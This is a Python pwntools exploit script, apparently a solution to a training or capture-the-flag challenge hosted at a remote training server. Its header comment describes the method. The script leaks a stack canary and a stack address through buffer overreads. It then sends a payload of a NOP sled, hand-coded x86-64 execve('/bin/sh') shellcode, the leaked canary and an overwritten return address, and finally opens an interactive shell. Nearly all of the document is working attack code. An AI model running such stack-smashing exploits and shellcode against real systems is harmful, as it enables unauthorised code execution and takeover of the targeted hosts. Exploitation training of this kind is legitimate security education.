from pwn import *

# Similar to leakers, first I use the read to leak the canary by doing a read of 105 bytes (BOF + first byte \x00
# of canary) and I save the canary. Then I use the same mechanism to leak an address of the stack which is present
# on the stack. I do some calculations in order to create an offset where I put the shellcode (in the buffer input)
# using a nop sled. Then I write all the payload with the nop sled, the shellcode, the canary, the new sEIP and 
# other nops to align the read.


context.arch = 'amd64'

shellcode = b"\x41"*105

#p = process("./leakers")
p = remote("bin.training.offdef.it", 2011)

p.send(shellcode)

p.recvuntil(b"> ")
time.sleep(0.1)  #to have two different read
p.read(105)
time.sleep(0.1)  #to have two different read
canary = b"\x00" + p.read(7)
canary = u64(canary)

shellcode = b"\x42"*152
p.send(shellcode)
p.recvuntil(b"> ")
time.sleep(0.1)  #to have two different read
p.read(152)
time.sleep(0.1)  #to have two different read
stack_address = p.read(6) + b"\x00" + b"\x00"
stack_address = u64(stack_address)
stack_address = stack_address - 376

payload = b"\x90"*70 + b"\x48\x8D\x3D\x00\x00\x00\x00\x48\xC7\xC0\x3B\x00\x00\x00\x48\x31\xD2\x48\x31\xF6\x48\x83\xC7\x13\x0F\x05/bin/sh\x00" + p64(canary) + b"\x90"*8 + p64(stack_address) + b"\x90"*72  #34 in second part
p.send(payload)

p.sendline("")
p.interactive()

